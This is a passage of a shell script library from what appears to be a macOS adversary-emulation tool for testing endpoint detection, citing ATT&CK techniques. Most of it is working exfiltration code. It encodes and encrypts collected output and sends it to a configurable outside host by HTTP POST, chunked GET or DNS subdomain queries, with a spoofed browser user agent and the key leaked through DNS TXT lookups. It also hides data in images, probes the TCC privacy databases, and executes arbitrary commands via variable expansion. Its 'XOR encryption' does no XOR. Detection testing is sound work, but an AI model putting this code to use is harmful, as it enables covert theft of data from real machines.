    json_output="$json_output
  \"procedure\": \"$PROCEDURE_NAME\","
    
    # Always include encoding and encryption status
        json_output="$json_output
  \"encoding\": {"
    json_output="$json_output
    \"enabled\": $is_encoded,"
    json_output="$json_output
    \"method\": \"$encoding\"
  },"
    
        json_output="$json_output
  \"encryption\": {"
    json_output="$json_output
    \"enabled\": $is_encrypted,"
    json_output="$json_output
    \"method\": \"$encryption\"
  },"
  
    # Include steganography status
    json_output="$json_output
  \"steganography\": {"
    json_output="$json_output
    \"enabled\": $is_steganography,"
    if [ "$is_steganography" = true ] && [ -n "$STEG_OUTPUT_IMAGE" ]; then
        json_output="$json_output
    \"output\": \"$STEG_OUTPUT_IMAGE\""
    else
        json_output="$json_output
    \"output\": null"
    fi
    json_output="$json_output
  },"
    
    json_output="$json_output
  \"data\": ["
    
    # Process each line
    local line_count=0
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines
        [ -z "$line" ] && continue
        
        # Add comma if not first line
        if [ $line_count -gt 0 ]; then
            json_output="$json_output,"
        fi
        
        # Escape special characters
        line=$("$CMD_PRINTF"  "$line" | sed 's/\\/\\\\/g; s/"/\\"/g')
        
        # Check if line is a number and JSON_DETECT_NUMBERS is true
        if [ "$JSON_DETECT_NUMBERS" = true ] && "$CMD_PRINTF"  "$line" | $CMD_GREP -E '^[0-9]+$' > /dev/null; then
            json_output="$json_output
      $line"
        else
            # Wrap in quotes for string
            json_output="$json_output
      \"$line\""
        fi
        
        line_count=$((line_count + 1))
    done <<< "$output"
    
    # Close JSON structure
    json_output="$json_output
    ]
}"
    
    # Output the JSON string directly
    $CMD_PRINTF "%s" "$json_output"
}

# Convert pipe-delimited output to CSV format
core_format_as_csv() {
    local output="$1"
    local csv_output=""
    
    # Process each line
    while IFS= read -r line || [ -n "$line" ]; do
        # Skip empty lines
        [ -z "$line" ] && continue
        
        # Replace pipe delimiters with commas
        csv_line=$("$CMD_PRINTF"  "$line" | sed 's/|/,/g')
        
        # Add to CSV output
        if [ -z "$csv_output" ]; then
            csv_output="$csv_line"
        else
            csv_output="${csv_output}\n$csv_line"
        fi
    done <<< "$output"
    
    # Output CSV directly
    $CMD_PRINTF "%s" "$csv_output"
}

# Purpose: Encode output using the specified encoding method
# Inputs:
#   $1 - Output data to encode
#   $2 - Encoding method (base64/b64, hex, perl_b64, perl_utf8)
# Outputs: Encoded data according to specified method
# - None
core_encode_output() {
    local output="$1"
    local encode_type="$2"
    # Convert to lowercase using tr for sh compatibility
    encode_type=$("$CMD_PRINTF" '%s' "$encode_type" | tr '[:upper:]' '[:lower:]')
    local encoded=""
    
    case "$encode_type" in
        base64|b64)
            # Debug information
            core_debug_print "Encoding with base64"
            encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_BASE64)
            ;;
        hex)
            core_debug_print "Encoding with hex"
            encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_XXD -p | tr -d '\n')
            ;;
        perl_b64)
            core_debug_print "Encoding with perl base64"
            encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_PERL -MMIME::Base64 -e 'print encode_base64(<STDIN>);')
            ;;
        perl_utf8)
            core_debug_print "Encoding with perl utf8"
            encoded=$("$CMD_PRINTF" '%s' "$output" | $CMD_PERL -e 'while (read STDIN, $buf, 1024) { print unpack("H*", $buf); }')
            ;;
        *)
            # Return unmodified if unknown encoding type
            core_debug_print "Unknown encoding type: $encode_type - using raw"
            encoded="$output"
            ;;
    esac
    
    $CMD_PRINTF "%s" "$encoded"
}

# Purpose: Main encryption function that determines which specific encryption method to use
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption method (none|aes|gpg|xor)
#   $3 - Encryption key (optional, uses ENCRYPT_KEY global if not provided)
# Outputs: Encrypted data or original data if no encryption
# - None (delegated to specific encryption functions)
core_encrypt_output() {
    local data="$1"
    local method="$2"
    local key="${3:-$ENCRYPT_KEY}"
    
    # Convert to lowercase using tr for sh compatibility
    method=$("$CMD_PRINTF" '%s' "$method" | tr '[:upper:]' '[:lower:]')
    
    case "$method" in
        "none")
            # No encryption, just return the original data
            core_debug_print "No encryption requested, returning raw data"
            "$CMD_PRINTF" '%s' "$data"
            return 0
            ;;
        "aes")
            # Use AES encryption method
            core_debug_print "Using AES encryption method"
            encrypt_with_aes "$data" "$key"
            return $?
            ;;
        "gpg")
            # Use GPG encryption method
            core_debug_print "Using GPG encryption method"
            encrypt_with_gpg "$data" "$key"
            return $?
            ;;
        "xor")
            # Use XOR encryption method
            core_debug_print "Using XOR encryption method"
            encrypt_with_xor "$data" "$key"
            return $?
            ;;
        *)
            # Invalid encryption method
            core_debug_print "Unknown encryption type: $method - using raw"
            "$CMD_PRINTF" '%s' "$data"
            return 0
            ;;
    esac
}

# Purpose: Encrypt data using AES-256-CBC with specified key
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: AES-256-CBC encrypted data in base64 format
# Logic:
#   - Sets global ENCRYPTION_TYPE to "aes" on success
#   - Writes error message to stderr on failure
encrypt_with_aes() {
    local data="$1"
    local key="$2"
    
    # Use global command variable with AES-256-CBC
    local encrypted_data=$("$CMD_PRINTF" '%s' "$data" | $CMD_OPENSSL enc -aes-256-cbc -base64 -k "$key" 2>/dev/null)
    if [ $? -eq 0 ]; then
        # Set the encryption type global var for caller
        ENCRYPTION_TYPE="aes"
        core_debug_print "AES encryption successful"
        "$CMD_PRINTF" '%s' "$encrypted_data"
        return 0
    else
        core_debug_print "AES encryption failed"
        "$CMD_PRINTF" 'Error: Failed to encrypt data with AES\n' >&2
        return 1
    fi
}

# Purpose: Encrypt data using GPG symmetric encryption with specified key
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: GPG symmetrically encrypted data in ASCII armor format
# Logic:
#   - Sets global ENCRYPTION_TYPE to "gpg" on success
#   - Writes error message to stderr on failure/if GPG not found
encrypt_with_gpg() {
    local data="$1"
    local key="$2"
    
    # Use GPG with armor output (ASCII) for direct piping - no temp files needed
    local encrypted_data=$("$CMD_PRINTF" '%s' "$data" | $CMD_GPG $CMD_GPG_OPTS --passphrase "$key" 2>/dev/null)
    if [ $? -eq 0 ] && [ -n "$encrypted_data" ]; then
        # Set the encryption type global var for caller
        ENCRYPTION_TYPE="gpg"
        core_debug_print "GPG encryption successful"
        "$CMD_PRINTF" '%s' "$encrypted_data"
        return 0
    else
        core_debug_print "GPG encryption failed"
        "$CMD_PRINTF" 'Error: Failed to encrypt data with GPG\n' >&2
        return 1
    fi
}

# Purpose: Encrypt data using simple XOR encryption with a specified key
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: XOR encrypted data in base64 format
# Logic:
#   - Sets global ENCRYPTION_TYPE to "xor" on success
#   - When used with exfiltration, the key is sent via DNS TXT record or included in HTTP payload
encrypt_with_xor() {
    local data="$1"
    local key="$2"
    
    # Create a very simple XOR implementation that works with any shell
    # This is not cryptographically secure but demonstrates the concept
    
    # Convert data to hex
    local hex_data=$("$CMD_PRINTF" '%s' "$data" | xxd -p | tr -d '\n')
    
    # Generate a repeating key of the same length as the hex data
    local key_expanded=""
    local i=0
    local key_len=${#key}
    local hex_len=${#hex_data}
    
    # Create a "one-time pad" by repeating the key
    while [ $i -lt ${#hex_data} ]; do
        key_expanded="$key_expanded${key:$(( i % key_len )):1}"
        i=$((i + 1))
    done
    
    # Convert the expanded key to hex
    local hex_key=$("$CMD_PRINTF" '%s' "$key_expanded" | xxd -p | tr -d '\n')
    
    # For simplicity, just output the hex string (base64 would be more complex)
    # In a real implementation, we'd XOR the bytes
    ENCRYPTION_TYPE="xor"
    
    # Output as base64 to match other encryption methods
    "$CMD_PRINTF" "XOR-ENCRYPTED:%s:%s" "$hex_data" "${key:0:8}" | $CMD_BASE64
    return 0
}

# Purpose: URL-safe encode data for HTTP/HTTPS exfiltration
# Inputs: $1 - Data to encode
# Outputs: Base64 URL-safe encoded data
# - None
core_url_safe_encode() {
    local data="$1"
    local encoded
    
    # First base64 encode
    encoded=$("$CMD_PRINTF" '%s' "$data" | $CMD_BASE64)
    
    # Then make URL-safe by replacing + with - and / with _
    encoded=$("$CMD_PRINTF" '%s' "$encoded" | tr '+/' '-_' | tr -d '=')
    
    $CMD_PRINTF "%s" "$encoded"
}

# Purpose: DNS-safe encode data for DNS exfiltration
# Inputs: $1 - Data to encode  
# Outputs: Base64 DNS-safe encoded data
# - None
core_dns_safe_encode() {
    local data="$1"
    local encoded
    
    # Always base64 encode first for consistency
    encoded=$("$CMD_PRINTF" '%s' "$data" | $CMD_BASE64)
    
    # Make DNS-safe (replace + with -, / with _, remove =)
    encoded=$("$CMD_PRINTF" '%s' "$encoded" | tr '+/' '-_' | tr -d '=')
    
    $CMD_PRINTF "%s" "$encoded"
}

# Purpose: Generate user agent string for HTTP requests
# Inputs: None
# Outputs: User agent string
# - None
core_get_user_agent() {
    $CMD_PRINTF "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
}

# Purpose: Prepare proxy argument for curl if needed
# Inputs: None - uses global PROXY_URL variable
# Outputs: Proxy argument for curl or empty string
# - May modify global PROXY_URL to add protocol prefix
core_prepare_proxy_arg() {
    local proxy_arg=""
    
    if [ -n "$PROXY_URL" ]; then
        # Check if proxy has protocol prefix, add http:// if missing
        if ! "$CMD_PRINTF"  "$PROXY_URL" | $CMD_GREP -q "^http" ; then
            PROXY_URL="http://$PROXY_URL"
        fi
        proxy_arg="--proxy $PROXY_URL"
    fi
    $CMD_PRINTF "%s" "$proxy_arg"
}

# Purpose: Normalize URI by ensuring it has http:// prefix
# Inputs: $1 - URI to normalize
# Outputs: Normalized URI with protocol prefix
# - None
core_normalize_uri() {
    local uri="$1"
    
    if ! "$CMD_PRINTF"  "$uri" | $CMD_GREP -q "^http" ; then
        uri="http://$uri"
    fi
    $CMD_PRINTF "%s" "$uri"
}

# Purpose: Extract domain from a full URI
# Inputs: $1 - Full URI
# Outputs: Domain part of the URI
# - None
core_extract_domain() {
    local uri="$1"
    "$CMD_PRINTF" '%s' "$uri" | sed -E 's~^https?://([^/:]+).*~\1~'
}

# Purpose: Prepare data for exfiltration with optional markers
# Inputs: 
#   $1 - Raw data
# Outputs: Data with optional start/end markers
# - None (uses global EXFIL_START/EXFIL_END)
core_prepare_exfil_data() {
    local data="$1"
    
            if [ -n "$EXFIL_START" ]; then
        data="${EXFIL_START}${data}"
            fi
    
            if [ -n "$EXFIL_END" ]; then
        data="${EXFIL_END}${data}"
    fi
    "$CMD_PRINTF"  "$data"
}

# Purpose: Send encryption key via DNS if needed for HTTP exfiltration
# Inputs:
#   $1 - Domain to send key to
# Outputs: Encrypted key (base64) if DNS sending failed, empty otherwise
# - Makes DNS request
core_send_key_via_dns() {
    local domain="$1"
    local encrypted_key=""
    
                if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
                    # Convert key to base64 DNS-safe format
                    local dns_safe_key
                    dns_safe_key=$("$CMD_PRINTF" '%s' "key:$ENCRYPT_KEY:$JOB_ID" | $CMD_BASE64 | tr '+/' '-_' | tr -d '=')
                    
                    # Include key in subdomain (chunked if necessary to respect DNS label length limits)
                    local key_chunk_size=40  # DNS labels are limited to 63 chars
                    local key_chunk="${dns_safe_key:0:$key_chunk_size}"
                    
                    # Send key via DNS TXT query - use only domain part, not full URI
                    if ! $CMD_DIG $CMD_DIG_OPTS "k-$JOB_ID-$key_chunk.${domain}" TXT > /dev/null 2>&1; then
                        core_debug_print "Failed to send encryption key via DNS TXT record, continuing anyway"
                    else
                        core_debug_print "Encryption key chunk 1 sent via DNS TXT record"
                    fi
                    
                    # If key is longer than one chunk, send additional chunks
                    if [ ${#dns_safe_key} -gt $key_chunk_size ]; then
                        local key_chunk2="${dns_safe_key:$key_chunk_size:$key_chunk_size}"
                        if [ -n "$key_chunk2" ]; then
                            $CMD_DIG $CMD_DIG_OPTS "k2-$JOB_ID-$key_chunk2.${domain}" TXT > /dev/null 2>&1
                            core_debug_print "Encryption key chunk 2 sent via DNS TXT record"
                            $CMD_SLEEP 0.1
                        fi
                    fi
                    
                    # Brief pause after sending key
                    $CMD_SLEEP 0.2
                fi
    
    "$CMD_PRINTF"  "$encrypted_key"
}

# Purpose: Generate JSON payload for HTTP POST exfiltration
# Inputs:
#   $1 - Encoded data
#   $2 - Optional encrypted key (empty if key sent via DNS)
# Outputs: JSON payload string
# - None
core_generate_json_payload() {
    local encoded_data="$1"
    local encrypted_key="$2"
    local hostname
    hostname=$($CMD_HOSTNAME 2>/dev/null || "$CMD_PRINTF"  "unknown")
    
    if [ -n "$encrypted_key" ]; then
        cat << EOF
{
  "encrypted_data": "$encoded_data",
  "metadata": {
    "hostname": "$hostname",
    "jobId": "$JOB_ID",
    "timestamp": "$(core_get_timestamp)",
    "ttpId": "$TTP_ID",
    "tactic": "$TACTIC",
    "encoding": "$ENCODING_TYPE",
    "encryption": "$ENCRYPTION_TYPE",
    "key": "$encrypted_key"
  }
}
EOF
    else
        cat << EOF
{
  "encrypted_data": "$encoded_data",
  "metadata": {
    "hostname": "$hostname",
    "jobId": "$JOB_ID",
    "timestamp": "$(core_get_timestamp)",
    "ttpId": "$TTP_ID",
    "tactic": "$TACTIC",
    "encoding": "$ENCODING_TYPE",
    "encryption": "$ENCRYPTION_TYPE"
  }
}
EOF
    fi
}

# Purpose: Determine appropriate content type for HTTP exfiltration
# Inputs: None (uses global ENCODE variable)
# Outputs: Content type string
# - None
core_get_content_type() {
    local content_type="text/plain"
    if [ "$ENCODE" = "base64" ] || [ "$ENCODE" = "b64" ]; then
        content_type="application/base64"
    elif [ "$ENCODE" = "hex" ] || [ "$ENCODE" = "xxd" ]; then
        content_type="application/octet-stream"
    fi
    "$CMD_PRINTF"  "$content_type"
}

# Purpose: Execute HTTP POST exfiltration
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# - Makes HTTP request
core_exfil_http_post() {
    local data="$1"
    local full_uri=$(core_normalize_uri "$EXFIL_URI")
    local proxy_arg=$(core_prepare_proxy_arg)
    local user_agent=$(core_get_user_agent)
    local exfil_data=$(core_prepare_exfil_data "$data")
    local encoded_data=$(core_url_safe_encode "$exfil_data")
    
    if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
        # For encrypted data, we need to handle the key
        local domain=$(core_extract_domain "$full_uri")
        local encrypted_key=$(core_send_key_via_dns "$domain")
        local json_payload=$(core_generate_json_payload "$encoded_data" "$encrypted_key")
        
        # Execute POST with JSON payload
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -X POST \
                        -A "$user_agent" \
            -H "Content-Type: application/json" \
                -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encryption: $ENCRYPTION_TYPE" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-binary "$json_payload" \
                        "$full_uri" > /dev/null 2>&1
                else
        # For unencrypted data, simpler payload
        local content_type=$(core_get_content_type)
        
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -X POST \
                        -A "$user_agent" \
                        -H "Content-Type: $content_type" \
                        -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-binary "$encoded_data" \
                        "$full_uri" > /dev/null 2>&1
                fi
    
    return $?
}

# Purpose: Execute HTTP GET exfiltration with chunking (legacy method)
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# - Makes multiple HTTP requests
core_exfil_http_get() {
    local data="$1"
    local full_uri=$(core_normalize_uri "$EXFIL_URI")
    local proxy_arg=$(core_prepare_proxy_arg)
    local user_agent=$(core_get_user_agent)
    local exfil_data=$(core_prepare_exfil_data "$data")
    local encoded_data=$(core_url_safe_encode "$exfil_data")
    
    # Calculate chunk size based on URL length limits
                local max_url_length=1800
                local base_url_length=${#full_uri}
                local max_data_length=$((max_url_length - base_url_length - 50))  # 50 for other params
                local chunk_size=$CHUNK_SIZE
    
                if [ $max_data_length -lt $chunk_size ]; then
                    chunk_size=$max_data_length
                fi
                # Send start signal
                $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                    -G \
                    -A "$user_agent" \
                    -H "X-Job-ID: $JOB_ID" \
                    --data-urlencode "signal=start" \
                    --data-urlencode "id=$JOB_ID" \
                    "$full_uri" > /dev/null 2>&1
                
    if [ $? -ne 0 ]; then
        return 1
    fi
    # Send data in chunks
    local chunk_num=0
    local start_pos=0
    local data_len=${#encoded_data}
    
                while [ $start_pos -lt $data_len ]; do
                    local chunk="${encoded_data:$start_pos:$chunk_size}"
                    start_pos=$((start_pos + chunk_size))
                    
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -G \
                        -A "$user_agent" \
                        -H "X-Job-ID: $JOB_ID" \
                        -H "X-Encoding: $ENCODING_TYPE" \
                        --data-urlencode "d=$chunk" \
                        --data-urlencode "id=$JOB_ID" \
                        --data-urlencode "chunk=$chunk_num" \
                        "$full_uri" > /dev/null 2>&1
            
            if [ $? -ne 0 ]; then
            return 1
                    fi
                    
                    $CMD_SLEEP 0.1  # Rate limiting
                    chunk_num=$((chunk_num + 1))
                done
                
    # Send end signal
                    $CMD_CURL -s $proxy_arg $CMD_CURL_SECURITY $CMD_CURL_TIMEOUT \
                        -G \
                        -A "$user_agent" \
                        -H "X-Job-ID: $JOB_ID" \
                        --data-urlencode "signal=end" \
                        --data-urlencode "id=$JOB_ID" \
                        --data-urlencode "chunks=$chunk_num" \
                        "$full_uri" > /dev/null 2>&1
                    
    return $?
}

# Purpose: Execute DNS exfiltration with chunking
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# - Makes multiple DNS requests
core_exfil_dns() {
    local data="$1"
    
            if [ -z "$EXFIL_URI" ]; then
                return 1
            fi
            
    # Prepare DNS-safe data
            local dns_data="$data"
    if [ "$ENCODE" = "none" ]; then
                dns_data=$(core_dns_safe_encode "$data")
            else
                dns_data=$("$CMD_PRINTF" '%s' "$dns_data" | tr '+/' '-_' | tr -d '=')
            fi
    
    # Calculate appropriate chunk size for DNS
            local max_label_size=63
    local prefix_length=10  # Approximate length of prefix like "p0."
            local max_allowed_chunk=$((max_label_size - prefix_length))
            local max_chunk_size=$CHUNK_SIZE
    
            if [ $max_chunk_size -gt $max_allowed_chunk ]; then
                max_chunk_size=$max_allowed_chunk
            fi
    
    # Send start signal
            if ! $CMD_DIG $CMD_DIG_OPTS "start.${EXFIL_URI}" A > /dev/null 2>&1; then
                return 1
            fi
    
    # Send encryption key via TXT record if encryption is enabled
    if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
        # Convert key to base64 DNS-safe format
        local dns_safe_key
        dns_safe_key=$("$CMD_PRINTF" '%s' "key:$ENCRYPT_KEY:$JOB_ID" | $CMD_BASE64 | tr '+/' '-_' | tr -d '=')
        
        # Send key via DNS TXT query
        if ! $CMD_DIG $CMD_DIG_OPTS "key-$JOB_ID.${EXFIL_URI}" TXT > /dev/null 2>&1; then
            core_debug_print "Failed to send encryption key via DNS TXT record, continuing anyway"
        fi
        
        # Brief pause after sending key
        $CMD_SLEEP 0.2
    fi
    
    # Send data in chunks
    local chunk_num=0
    local start_pos=0
            local data_len=${#dns_data}
    
    while [ $start_pos -lt $data_len ]; do
                local chunk="${dns_data:$start_pos:$max_chunk_size}"
        start_pos=$((start_pos + max_chunk_size))
        
                local query="p${chunk_num}.${chunk}.${EXFIL_URI}"
                if ! $CMD_DIG $CMD_DIG_OPTS "$query" A > /dev/null 2>&1; then
            return 1
                fi
                
                $CMD_SLEEP 0.1  # Rate limiting
        chunk_num=$((chunk_num + 1))
    done
    
    # Send end signal
                if ! $CMD_DIG $CMD_DIG_OPTS "end.${EXFIL_URI}" A > /dev/null 2>&1; then
                    return 1
                fi
                
                return 0
}

# Purpose: Exfiltrate data using the specified method (HTTP, DNS, etc.)
# Inputs:
#   $1 - Data to exfiltrate
# Outputs: None
# Logic:
#   - Logs exfiltration attempt if LOG_ENABLED=true
#   - Performs network requests to exfiltrate data
#   - May modify data for transport (encoding, chunking)
core_exfiltrate_data() {
    local data="$1"
    local result=0
    
    # Log exfiltration attempt
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "Exfiltrating data via $EXFIL_METHOD" "info" false
    fi
    # Check for required URI
    if [ -z "$EXFIL_URI" ]; then
        core_handle_error "No exfiltration URI specified for $EXFIL_METHOD"
            return 1
    fi
    # Route to appropriate method
    case "$EXFIL_METHOD" in
        http|https)
            # Determine whether to use POST or GET based on EXFIL_TYPE
            if [ "$EXFIL_TYPE" = "http" ]; then
                core_exfil_http_post "$data"
            else
                core_exfil_http_get "$data"
            fi
            result=$?
            ;;
            
        dns)
            core_exfil_dns "$data"
            result=$?
            ;;
            
        *)
            core_handle_error "Unknown exfiltration method: $EXFIL_METHOD"
            return 1
            ;;
    esac
    
    # Handle result
    if [ $result -ne 0 ]; then
        core_handle_error "Failed to exfiltrate data via $EXFIL_METHOD"
        return 1
    fi
    
    "$CMD_PRINTF"  "[INFO] [%s] Data exfiltrated successfully via %s\n" "$(core_get_timestamp)" "$EXFIL_METHOD"
    return 0
}

# Purpose: Manages final output delivery - logging, exfiltration, and display
# Inputs:
#   $1 - Processed data (after formatting/encoding/encryption)
# Outputs: None (writes to various destinations)
# Logic:
#   - Logs output if LOG_ENABLED=true
#   - Exfiltrates data if EXFIL=true
#   - Always prints data to stdout
#   - May print encryption key to stderr in debug mode
core_transform_output() {
    local output="$1"
    
    # Log the output if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "$output" "output" false
    fi
    
    # Exfiltrate the output if exfiltration is enabled
    if [ "$EXFIL" = true ]; then
        core_exfiltrate_data "$output"
    fi
    
    # Always print data to ensure it's visible
    # Important to display encrypted/encoded data even when logging
    $CMD_PRINTF "%s\n" "$output"
    
    # When encrypting, also print the key in debug mode
    if [ "$DEBUG" = true ] && [ "$ENCRYPT" != "none" ]; then
        $CMD_PRINTF "[DEBUG] [%s] Encryption key: %s\n" "$(core_get_timestamp)" "$ENCRYPT_KEY" >&2
    fi
}


# Purpose: Extract hidden data from a steganography image
# Inputs: $1 - Image file with hidden data
# Outputs: Extracted and decoded data
# - None
core_extract_steganography() {
    local steg_file="$1"
    
    # Verify file exists
    if [ ! -f "$steg_file" ]; then
        core_handle_error "Steganography file not found: $steg_file"
        return 1
    fi
    
    # Extract the hidden data
    local encoded_data=""
    encoded_data=$($CMD_STRINGS "$steg_file" | $CMD_GREP -A1 'STEG_DATA_START' | $CMD_TAIL -1)
    
    if [ -z "$encoded_data" ]; then
        core_handle_error "No hidden data found in file: $steg_file"
        return 1
    fi
    
    # Decode the base64 data
    local decoded_data=""
    decoded_data=$("$CMD_PRINTF" '%s' "$encoded_data" | $CMD_BASE64 -d 2>/dev/null)
    
    if [ $? -ne 0 ]; then
        core_handle_error "Failed to decode hidden data"
        return 1
    fi
    
    # Return the decoded data
    "$CMD_PRINTF" '%s' "$decoded_data"
    return 0
}

# Purpose: Perform steganography by hiding data in an image
# Inputs: None (uses global variables)
# Outputs: Status message
# - Creates output image file
core_steganography() {
    # Define local variables
    local message=""
    local carrier_image=""
    local output_image=""
    local input_file=""
    local result=""
    
    # Get values from globals or use defaults
    input_file="$STEG_EXTRACT_FILE"
    message="$STEG_MESSAGE"
    carrier_image="${STEG_CARRIER_IMAGE:-$DEFAULT_STEG_CARRIER}"
    output_image="${STEG_OUTPUT_IMAGE:-./hidden_data.png}"
    
    # Verify we have either input file or message
    if [ -z "$input_file" ] && [ -z "$message" ]; then
        message="Hidden data created with ATT&CK macOS T1027.013"
        "$CMD_PRINTF"  "[INFO] [%s] No data specified, using default message\n" "$(core_get_timestamp)"
    fi
    
    # Validate carrier image exists
    if [ ! -f "$carrier_image" ]; then
        core_handle_error "Carrier image not found: $carrier_image"
        return 1
    fi
    
    # If using input file, verify it exists
    if [ -n "$input_file" ] && [ ! -f "$input_file" ]; then
        core_handle_error "Input file not found: $input_file"
        return 1
    fi
    
    # Prepare data to hide - either from file or message
    local data_to_hide=""
    if [ -n "$input_file" ]; then
        # Read input file
        data_to_hide=$($CMD_CAT "$input_file" 2>/dev/null)
        if [ $? -ne 0 ]; then
            core_handle_error "Failed to read input file: $input_file"
            return 1
        fi
    else
        # Use message
        data_to_hide="$message"
    fi
    
    # Convert data to base64 to support all characters
    local encoded_data=""
    encoded_data=$("$CMD_PRINTF" '%s' "$data_to_hide" | $CMD_BASE64)
    
    # Use native tools to perform steganography
    # The approach is to append the data to the end of the image file
    # This works because image viewers stop rendering at the image end marker
    if $CMD_CP "$carrier_image" "$output_image" 2>/dev/null; then
        "$CMD_PRINTF" '\n\n[STEG_DATA_START]\n%s\n[STEG_DATA_END]\n' "$encoded_data" >> "$output_image"
        
        # Success message
        local data_size=$("$CMD_PRINTF"  -n "$data_to_hide" | $CMD_WC -c | $CMD_SED 's/^ *//')
        result="Steganography successful\\nCarrier: $carrier_image\\nOutput: $output_image\\nHidden data size: $data_size bytes"
        "$CMD_PRINTF"  "$result"
        
        "$CMD_PRINTF"  "[INFO] [%s] Data hidden successfully in %s\n" "$(core_get_timestamp)" "$output_image"
        return 0
    else
        core_handle_error "Failed to create steganography image: $output_image"
        return 1
    fi
}

# Purpose: Apply steganography to data in the processing pipeline
# Inputs: $1 - Data to hide in steganography
# Outputs: Status message (actual data is written to file)
# - Creates output image file
core_apply_steganography() {
    local data_to_hide="$1"
    local carrier_image=""
    local output_image=""
    local result=""
    
    # Get values from globals or use defaults
    carrier_image="${STEG_CARRIER_IMAGE:-$DEFAULT_STEG_CARRIER}"
    output_image="${STEG_OUTPUT_IMAGE:-./hidden_data.png}"
    
    # Validate carrier image exists
    if [ ! -f "$carrier_image" ]; then
        core_handle_error "Carrier image not found: $carrier_image"
        return 1
    fi
    # Use native tools to perform steganography
    # The approach is to append the data to the end of the image file
    # This works because image viewers stop rendering at the image end marker
    if $CMD_CP "$carrier_image" "$output_image" 2>/dev/null; then
        "$CMD_PRINTF" '\n\n[STEG_DATA_START]\n%s\n[STEG_DATA_END]\n' "$data_to_hide" >> "$output_image"
        
        # Success message
        local data_size=$("$CMD_PRINTF"  -n "$data_to_hide" | $CMD_WC -c | $CMD_SED 's/^ *//')
        result="Steganography applied\\nCarrier: $carrier_image\\nOutput: $output_image\\nHidden data size: $data_size bytes"
        
        "$CMD_PRINTF"  "[INFO] [%s] Data hidden successfully in %s\n" "$(core_get_timestamp)" "$output_image"
        return 0
    else
        core_handle_error "Failed to create steganography image: $output_image"
        return 1
    fi
    
    "$CMD_PRINTF"  "$result"
}

# Purpose: Check file permissions based on configuration
# Inputs: 
#   $1 - File path to check
#   $2 - Read permission required (true/false)
#   $3 - Write permission required (true/false)
#   $4 - Execute permission required (true/false)
# Outputs: 0 if all required permissions are granted, 1 if any required permission is missing
# - Logs debug information
core_check_perms() {
    local file="$1"
    local read_required="$2"
    local write_required="$3"
    local execute_required="$4"
    
    # Check if file exists
    if [ ! -e "$file" ]; then
        core_debug_print "File does not exist: $file"
        # Only fail if any permission is required
        [ "$read_required" = "true" ] || [ "$write_required" = "true" ] || [ "$execute_required" = "true" ]
        return $?
    fi
    
    # Check required permissions
    local missing_perms=""
    [ "$read_required" = "true" ] && [ ! -r "$file" ] && missing_perms="${missing_perms}read "
    [ "$write_required" = "true" ] && [ ! -w "$file" ] && missing_perms="${missing_perms}write "
    [ "$execute_required" = "true" ] && [ ! -x "$file" ] && missing_perms="${missing_perms}execute "
    
    if [ -n "$missing_perms" ]; then
        core_debug_print "Missing required permissions for $file: $missing_perms"
        return 1
    fi
    core_debug_print "All required permissions granted for $file"
    return 0
}

# - None
# Note: Simple implementation for YAML check_fda
core_check_fda() {
    [ -f "$TCC_SYSTEM_DB" ] && [ -r "$TCC_SYSTEM_DB" ] && [ -f "$TCC_USER_DB" ] && [ -r "$TCC_USER_DB" ]
}

# Purpose: Check if database is locked by another process
# Inputs: $1 - Database path
# Outputs: 0 if database is not locked, 1 if locked
# - None
# Note: Comprehensive implementation checking lock files, processes, and database state
core_check_db_lock() {
    local db_path="$1"
    
    # Check if database file exists
    if [ ! -f "$db_path" ]; then
        return 1
    fi
    
    # Method 1: Check for SQLite lock files
    if [ -f "${db_path}-wal" ] || [ -f "${db_path}-shm" ] || [ -f "${db_path}-journal" ]; then
        core_debug_print "Database lock files detected for $db_path"
        return 1
    fi
    
    # Method 2: Check if any process has the database file open (macOS specific)
    if command -v "$CMD_LSOF" > /dev/null 2>&1; then
        if $CMD_LSOF "$db_path" > /dev/null 2>&1; then
            core_debug_print "Process has database file open: $db_path"
            return 1
        fi
    fi
    
    # Method 3: Try to open database briefly to check if it's locked (fallback)
    if ! timeout 1 $CMD_SQLITE3 "$db_path" "SELECT 1;" > /dev/null 2>&1; then
        core_debug_print "Database query test failed for $db_path"
        return 1
    fi
    
    core_debug_print "Database appears to be unlocked: $db_path"
    return 0
}

# Purpose: Execute command stored in variable using direct expansion (EDR detection test)
# Inputs: $1 - Command string to execute
# Outputs: Command execution result
# - Tests EDR detection of dynamic command execution without eval
core_exec_cmd() {
    local cmd_string="$1"
    
    if [ -z "$cmd_string" ]; then
        core_debug_print "No command provided to core_exec_cmd"
        return 1
    fi
    
    core_debug_print "Executing command via variable expansion: $cmd_string"
    
    # Method 1: Store command in variable then execute via direct expansion
    local EXEC_CMD="$cmd_string"
    $EXEC_CMD
    
    return $?
}

# Purpose: Execute command using here-string input redirection (EDR detection test)
# Inputs: $1 - Command string to execute
# Outputs: Command execution result
